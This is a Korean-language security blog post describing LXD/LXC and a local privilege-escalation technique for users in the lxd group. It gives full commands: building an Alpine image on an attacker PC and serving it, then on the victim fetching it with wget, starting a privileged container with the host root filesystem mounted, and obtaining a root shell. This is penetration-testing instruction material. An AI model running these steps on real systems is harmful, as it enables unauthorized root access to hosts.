---
layout: single
title: Privilege Escalation Using LXD_LXC Group Assignment
categories: Other-Vuln
tag: [lxd, lxc, LXD_LXC Group Assignment, Privilege Escalation]
toc: true
author_profile: false
---

# LXD/LXC 란 무엇인가?
## lxc
- 리눅스 컨테이너 기술의 초기 형태로, 프로세스와 자원을 격리하여 가벼운 가상화 환경을 제공하는데 사용되며, 이를 통해 머신의 여러 인스턴스를 운영할 수 있다.
- 현재로서는, 개발 및 테스트 환경에서 다양한 리눅스 배포판 및 특정 소프트웨어의 버전 테스트에 사용되며, 여러 서비스를 단일 호스트에서 격리하여 운영할 수 있다.

## lxd 
- lxc를 기반으로 현대적인 시스템 컨테이너 매니저로서, lxc의 상위 레벨 도구이다.
- REST API 를 통해 컨테이너 관리 자동화 및 스크립트화 할 수 있으며, 다양한 네트워크 설정을 지원하고 이미지 서버를 통해 다양한 리눅스 배포판 이미지를 다운로드하고 사용할 수 있다.
- 현재로서는, 개발 테스트, 어플리케이션 배포, 격리된 호스팅 서비스, 클라우드 환경에서의 경량화된 가상 머신 대안으로 사용된다.

# LXD Privilege Escalation
<div class="notice">
  로컬 시스템의 침투에 성공한 경우 sudo 권한이 없더라도 접속한 계정이 lxd 그룹의 포함되어 있다면, 해당 호스트에서 루트로 권한 상승이 가능하다.
  lxd는 lxd unix 소켓에 대한 쓰기 액세스 권한을 가지고 있을 경우, 작업을 수행하는 루트 프로세스이므로, 이를 악용하는 여러 방법이 존재한다.
</div>

![그림 1-1](/assets/image/vuln/Other-Vuln/LXD_LXC/image.png)
- 사진과 같이 115(lxd) 그룹에 속해있을 경우 이를 악용할 수 있게 된다.

<span style="font-weight: bold; color: red;">해당 공격을 수행하기 위해서는 공격자 PC와 희생자 PC에서 수행해야하는 단계들이 존재한다.
 </span>

## 공격자 PC
1. git을 통해 공격자 pc에 build-alpine를 가져온다.
2. build-alpine를 root 권한으로 실행한다.
3. 임의의 웹 서버를 열어 tar파일을 희생자 pc에서 다운받을 수 있도록 한다.

## 희생자 PC
1. alpine 이미지를 다운한다.
2. lxd에 대한 이미지를 가져온다.
3. 새로운 컨테이너 안에서 이미지를 초기화 한다.
4. /root 디레렉터리 내부에 컨테이너를 마운트한다.

### 공격자 PC에서의 사전 준비

```
git clone https://github.com/saghul/lxd-alpine-builder.git<br>
cd lxd-alpine-builder<br>
sudo ./build-alpine
```

![그림 1-2](/assets/image/vuln/Other-Vuln/LXD_LXC/image-1.png)<br>
![그림 1-3](/assets/image/vuln/Other-Vuln/LXD_LXC/image-2.png)

### 희생자 PC에서의 사전 준비

```
wget http://ip:port/~~tar.gz
lxc image import ./~~tar.gz --alias myimage
lxc image list
```

![그림 1-4](/assets/image/vuln/Other-Vuln/LXD_LXC/image-3.png)

```
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

<div class="notice">
  위 과정을 모두 거쳐 정상적으로 root 디렉터리에 마운트가 되면,  root shell을 획득하게 된다.
</div>

<div class="notice">
    <span style="font-weight: bold; color: red;">
        uid=0(root) gid=0(root)
    </span>
</div>

# Referance
- https://www.hackingarticles.in/lxd-privilege-escalation/